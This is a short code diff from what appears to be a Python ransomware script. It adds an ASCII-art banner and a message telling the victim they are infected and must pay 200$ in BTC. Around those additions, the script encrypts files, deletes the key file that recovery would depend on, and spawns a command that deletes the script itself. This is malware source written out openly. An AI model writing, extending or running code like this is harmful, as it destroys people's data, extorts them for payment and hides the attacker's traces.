@@ -72,11 +72,20 @@ if __name__ == "__main__":
             print(f"Encrypted {file}")
         except Exception as e:
             print(f"Failed to encrypt {file}: {e}")
-
+    print(r"""
+___________.__  .__        __ /\        ___________                                   __  .__               
+\_   _____/|  | |__| _____/  |)/ ______ \_   _____/ ____   ___________ ___.__._______/  |_|__| ____   ____  
+ |    __)_ |  | |  |/  _ \   __\/  ___/  |    __)_ /    \_/ ___\_  __ <   |  |\____ \   __\  |/  _ \ /    \ 
+ |        \|  |_|  (  <_> )  |  \___ \   |        \   |  \  \___|  | \/\___  ||  |_> >  | |  (  <_> )   |  \
+/_______  /|____/__|\____/|__| /____  > /_______  /___|  /\___  >__|   / ____||   __/|__| |__|\____/|___|  /
+        \/                          \/          \/     \/     \/       \/     |__|                       \/ 
+""")
+    print("you have been infected with ransomware pay 200$ in BTC to this wallet")
     os.remove("key.key")
     filename = sys.argv[0]
     # Spawn a new process to delete this file after a delay
     os.system(f"sleep 1 && rm {filename} &")
+
 
 
 
